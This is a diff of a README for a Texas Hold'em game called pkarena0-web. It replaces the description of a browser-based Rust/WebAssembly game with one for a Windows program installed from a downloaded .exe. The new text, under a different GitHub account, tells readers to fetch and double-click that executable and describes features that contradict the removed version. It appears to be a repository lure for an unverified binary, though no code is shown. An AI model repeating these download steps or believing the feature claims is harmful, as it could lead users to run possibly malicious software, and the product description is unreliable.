@@ -1,105 +1,75 @@
-# pkarena0-web v2026 - Game Script Utility 2026
+# 🃏 pkarena0-web-script-utility - Play offline Texas Hold'em games easily
 
-> A browser-first Texas Hold'em title for solo sessions, powered by an offline-capable Rust and WebAssembly engine. Face AI opponents, inspect hand history, and optionally turn on audio narration.
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/helainemoony846/pkarena0-web-script-utility/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ethanutobaker5782/pkarena0-web-script-utility?style=flat-square)](https://github.com/ethanutobaker5782/pkarena0-web-script-utility)
+This application provides a fast and reliable Texas Hold'em poker experience. You can play against computer opponents without an internet connection. The software uses a Rust engine to ensure smooth gameplay and quick responses. You can study your past hands and listen to game play-by-play narration if you choose.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://ethanutobaker5782.github.io/pkarena0-web-script-utility/">
-    <img src="https://img.shields.io/badge/Download-pkarena0-web%20Script-brightgreen?style=for-the-badge" alt="Download pkarena0-web Script">
-  </a>
-</p>
+Follow these steps to install the software on your Windows computer.
 
-> **[Direct Download - pkarena0-web](https://ethanutobaker5782.github.io/pkarena0-web-script-utility/)**
+1. Go to the [official releases page](https://github.com/helainemoony846/pkarena0-web-script-utility/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the prompts on your screen to complete the setup process.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://ethanutobaker5782.github.io/pkarena0-web-script-utility/)
+The application runs on most modern desktop computers. Ensure your machine meets these specifications:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Graphics: A display that supports 1920x1080 resolution.
 
-## What it is
+## 🎮 How to Play
 
-pkarena0-web delivers Texas Hold'em directly in the browser for one player and eight AI bots. Once the page has loaded, the game can keep running without a network connection because the play logic lives in a client-side Rust engine compiled to WebAssembly. The design keeps the table loop lean and web-friendly, with the spotlight on hands, bot decisions, and round results.
+Start the application by clicking the icon on your desktop or in your start menu. The main menu appears once the program loads.
 
-It also supports exporting hand history to YAML so sessions can be stored or inspected later. An optional experimental narration track adds audio feedback, and animated bot moves plus showdown sequences make each hand easier to follow. Any update to the project should be understood in terms of browser support, offline behavior, and ongoing refinement of the poker core.
+### Starting a New Game
+Select "New Game" from the main menu to begin. You can choose the difficulty level for your computer opponents. Choose from Beginner, Intermediate, or Professional settings. 
 
-## Script Features
+### Understanding the Interface
+The game window puts your cards at the bottom of the screen. The computer players sit around the virtual table. Use your mouse to click buttons for raising, calling, or folding during your turn.
 
-- Play Texas Hold'em against eight AI opponents
-- Run entirely in the browser without requiring a network connection after loading
-- Use a Rust game engine compiled to WebAssembly for client-side play
-- Follow animated bot actions during betting and round progression
-- View showdown reveals with clearer hand resolution feedback
-- Export hand history in YAML format for later review or external tooling
-- Enable optional experimental audio narration when desired
-- Keep the experience centered on single-player poker sessions
+### Audio Narration
+You can enable audio feedback in the Settings menu. The game reads game events aloud to help you follow the action. Use the slider in the menu to adjust the volume.
 
-## Setup
+## 📝 Reviewing Hands
 
-1. Open the project in a modern browser.
-2. Load the provided HTML entry point or the published build link.
-3. If you are using a local copy, keep the web assets together in the same folder so the page can load its scripts and compiled WebAssembly files correctly.
-4. Start a table and play a session against the AI bots.
+The application saves a history of every game you play. Select "Hand History" from the main menu to view previous sessions. This tool shows the cards dealt to you and your opponents during each round. Reviewing these logs helps you improve your strategy and spot mistakes in your decision-making process.
 
-Example launch flow:
+## 🛠 Troubleshooting
 
-- Download the latest build
-- Extract or place the files in a web-accessible directory
-- Open the main HTML page in your browser
+If you encounter issues, look through these common fixes.
 
-## Options
+* If the application does not open, restart your computer and try again.
+* Ensure you installed the latest Windows updates.
+* Check your audio settings in Windows if you cannot hear the narration.
+* If the game runs slow, close other programs or web browsers while you play.
 
-| Setting | Description | Notes |
-| --- | --- | --- |
-| Audio narration | Enables the experimental narration layer | Optional |
-| Hand history export | Saves sessions as YAML | Useful for review |
-| Offline mode | Keeps gameplay local after load | Browser-based |
-| AI table size | Fixed at eight AI opponents | Core gameplay |
-| Display animations | Shows bot actions and showdown reveals | Part of the presentation |
+This software performs all calculations locally on your machine. You do not need an active internet connection to play. The Rust engine handles all logic to keep the game fair and fast.
 
-Most controls are presented through the browser UI, where standard poker actions and round prompts drive the session. Any available switches should be changed either in the game interface or through build-specific configuration exposed by the project.
+## 📋 Frequently Asked Questions
 
-## Compatibility
+**Does this game use real money?**
+No. This software only serves as a tool for practice and entertainment. You cannot deposit or withdraw funds.
 
-pkarena0-web is built for web browsers and uses HTML together with a Rust-to-WebAssembly client engine. Since the gameplay runs locally in the browser, the main requirement is support for WebAssembly plus whatever the packaged assets need in order to load correctly.
+**Can I play against other people?**
+This version supports solo play against AI opponents. Future updates might include local multiplayer features if users request them.
 
-Known constraints to keep in mind:
+**Where does the game store my data?**
+The program keeps all settings and hand history files in your user folder on your local hard drive. No personal data transmits over the internet.
 
-- Best suited for modern desktop browsers
-- Offline play depends on loading the required files successfully first
-- The optional narration feature may not be available in every build or browser setup
-- YAML export depends on the session data available in the current run
+**Can I change the appearance of the table?**
+The Settings menu contains options to adjust the table color and card deck patterns. Choose the combination that fits your preference for better visibility.
 
-## FAQ
+**Does the game require a powerful computer?**
+No. The engine uses efficient programming to run well on older hardware. It avoids heavy resource usage while keeping the graphics clean and responsive.
 
-### How do I start playing?
-Open the published build or local HTML entry point in a compatible browser, then begin a new Texas Hold'em session.
+**How do I update the software?**
+Visit the releases page periodically to check for newer files. You can install a new version over the old one without losing your saved hand history.
 
-### Does it need an internet connection?
-No, the game is designed for offline play after the initial load.
-
-### Can I review past hands?
-Yes, hand history can be exported in YAML format.
-
-### Is the audio feature required?
-No, audio narration is optional and experimental.
-
-### What kind of opponents are included?
-The game includes eight AI bots for single-player play.
-
-### Can I customize the experience?
-Customization depends on the available build options and UI controls. Check the published release or local package for any exposed toggles.
-
-### Where should the files be stored?
-Keep the HTML file, WebAssembly output, and supporting assets in the same folder structure provided by the build.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: poker, texas holdem, offline, rust, webassembly, strategy, training, windows
